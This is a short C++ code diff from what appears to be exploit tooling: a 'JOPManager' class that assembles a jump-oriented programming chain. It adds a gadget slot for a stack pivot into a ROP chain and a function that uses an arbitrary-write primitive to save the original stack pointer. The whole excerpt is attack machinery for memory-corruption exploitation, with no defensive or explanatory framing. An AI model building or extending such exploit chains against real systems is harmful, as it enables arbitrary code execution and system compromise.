@@ -75,8 +75,20 @@ void JOPManager::Build(UINT64 g1Off, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off) {
     // gadget4 continuation: [newRax+0x28] -> rop pivot
     AddSlot("g4_cont [newRax+0x28]", SCRATCH_G4_CONT, 0);
 
+    // pop rdx scratch: RSP points here, gadget2 pops rdx from [rsp]
+    // rdx = scratchBase + SCRATCH_NEW_RAX - 0x1B0 (computed above)
+    AddSlot("pop_rdx [rsp]", SCRATCH_POP_RDX, rdx);
+
     DbgLog("[JOP] Build complete - %zu slots, scratch base=0x%llX\n",
         slots.size(), scratchBase);
+}
+
+void JOPManager::SetOriginalRsp(UINT64 originalRsp) {
+    if (!scratchBase) { DbgLog("[JOP::SetOriginalRsp] FAIL: scratchBase not set\n"); return; }
+    if (!writeFn)     { DbgLog("[JOP::SetOriginalRsp] FAIL: no write primitive\n"); return; }
+    UINT64 slot = scratchBase + SCRATCH_STACK_TOP;
+    DbgLog("[JOP::SetOriginalRsp] [STACK_TOP=0x%llX] = originalRsp=0x%llX\n", slot, originalRsp);
+    writeFn(slot, originalRsp);
 }
 
 void JOPManager::SetCallTarget(UINT64 addr) {
